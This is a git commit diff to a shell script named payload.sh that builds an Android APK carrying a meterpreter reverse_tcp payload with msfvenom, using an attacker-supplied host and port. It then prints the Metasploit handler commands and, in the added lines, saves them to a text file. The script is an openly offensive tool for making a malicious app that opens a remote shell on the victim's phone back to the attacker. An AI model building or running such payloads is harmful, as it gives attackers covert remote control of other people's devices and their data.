bee184cb57716a37fc1b8cc59839e50c84f6b8d0
Raj hackers <153776272+Rajhackers@users.noreply.github.com>
2024-03-11 00:42:06 +0530

    Save file
    Thanks

--- payload.sh
+++ payload.sh
@@ -13,18 +13,27 @@ read -p "Enter payload name: " n3
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$n1 LPORT=$n2 -o $n3.apk
 sleep 3
 clear
+
 # Display Metasploit commands
 echo "msfconsole"
-
-echo "use exploit/multi/handler"
 echo "set payload android/meterpreter/reverse_tcp"
-
 echo "set LHOST $n1"
 echo "set LPORT $n2"
-
-
-echo "              #<=run payload=>#    "
-
-
+echo "#<=run payload=>#"
 echo "exploit -j"
 echo "sessions -i"
+
+# Save Metasploit commands to a file named $n3.txt
+echo "payload name =  $n3 " > $n3.txt
+echo "payload ip =  $n1  " >> $n3.txt
+echo "payload port =  $n2  " >> $n3.txt
+echo "" >> $n3.txt
+echo "" >> $n3.txt
+echo "msfconsole" >> $n3.txt
+echo "set payload android/meterpreter/reverse_tcp" >> $n3.txt
+echo "set LHOST $n1" >> $n3.txt
+echo "set LPORT $n2" >> $n3.txt
+echo "" >> $n3.txt
+echo "#<=run payload=>#" >> $n3.txt
+echo "exploit -j" >> $n3.txt
+echo "sessions -i" >> $n3.txt
